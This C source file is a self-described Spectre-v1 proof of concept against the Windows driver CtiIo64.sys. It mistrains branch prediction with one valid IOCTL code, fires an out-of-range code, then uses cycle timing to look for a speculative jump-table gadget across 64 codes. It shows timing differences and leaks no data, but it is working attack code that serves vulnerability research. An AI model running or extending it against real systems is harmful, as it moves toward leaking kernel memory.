// poc.c - Spectre-v1 PoC for CtiIo64.sys (S2 jump-table gadget).
//
// A/B experiment: time IOCTL round-trips for codes 0x80502140..0x8050217f
// after a mistraining burst of the in-range code 0x80502140, once with a
// benign follow-up (the same in-range code) and once with the out-of-range
// code 0x805021A0. The S2 gadget's mistrained branch appears as a timing
// difference for codes whose predicted target crosses the speculative path.

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <intrin.h>

#pragma comment(lib, "advapi32.lib")

#define CTI_DEVICE      "\\\\.\\CtiIo"
#define IOCTL_VALID     0x80502140u
#define IOCTL_OOB       0x805021A0u
#define TRAIN_ROUNDS    1500
#define PROBE_CODES     64
#define TIMES_PER_CODE  300

static uint64_t time_ioctl(HANDLE h, DWORD code, uint8_t* buf) {
    DWORD ret;
    uint32_t a;
    uint64_t t1 = __rdtscp(&a);
    _mm_lfence();
    DeviceIoControl(h, code, buf, 0x10, buf, 0x10, &ret, NULL);
    _mm_lfence();
    uint64_t t2 = __rdtscp(&a);
    return t2 - t1;
}

int main(void) {
    SetProcessAffinityMask(GetCurrentProcess(), 1ull);
    printf("[*] CtiIo64.sys Spectre-v1 A/B PoC\n");

    HANDLE h = CreateFileA(CTI_DEVICE, GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        printf("[-] cannot open %s (err=%lu)\n", CTI_DEVICE, GetLastError());
        return 1;
    }
    printf("[+] opened %s\n", CTI_DEVICE);

    uint8_t buf[16] = {0};
    DWORD ret;
    uint64_t A[PROBE_CODES] = {0};  // after benign burst
    uint64_t B[PROBE_CODES] = {0};  // after OOB trigger

    // Arm A: train then probe with a benign in-range code.
    for (int c = 0; c < PROBE_CODES; ++c) {
        DWORD code = 0x80502140u + c;
        for (int i = 0; i < TRAIN_ROUNDS; ++i)
            DeviceIoControl(h, IOCTL_VALID, buf, 0x10, buf, 0x10, &ret, NULL);
        _mm_mfence();
        uint64_t s = 0;
        for (int i = 0; i < TIMES_PER_CODE; ++i) s += time_ioctl(h, code, buf);
        A[c] = s / TIMES_PER_CODE;
    }

    // Arm B: train, fire the OOB code, then probe.
    for (int c = 0; c < PROBE_CODES; ++c) {
        DWORD code = 0x80502140u + c;
        for (int i = 0; i < TRAIN_ROUNDS; ++i)
            DeviceIoControl(h, IOCTL_VALID, buf, 0x10, buf, 0x10, &ret, NULL);
        _mm_mfence();
        DeviceIoControl(h, IOCTL_OOB, buf, 0x10, buf, 0x10, &ret, NULL);
        _mm_mfence();
        uint64_t s = 0;
        for (int i = 0; i < TIMES_PER_CODE; ++i) s += time_ioctl(h, code, buf);
        B[c] = s / TIMES_PER_CODE;
    }

    printf("[*] code      A(benign)  B(OOB)   delta(B-A)\n");
    int anomalous = 0;
    for (int c = 0; c < PROBE_CODES; ++c) {
        long long d = (long long)B[c] - (long long)A[c];
        printf("    0x%08x  %8llu  %8llu  %+lld%s\n",
               0x80502140u + c, (unsigned long long)A[c],
               (unsigned long long)B[c], d,
               (d < -8 || d > 8) ? "  *" : "");
        if (d < -8 || d > 8) ++anomalous;
    }
    CloseHandle(h);
    printf("[*] %d / %d codes show a B-A difference beyond the noise floor\n",
           anomalous, PROBE_CODES);
    return 0;
}
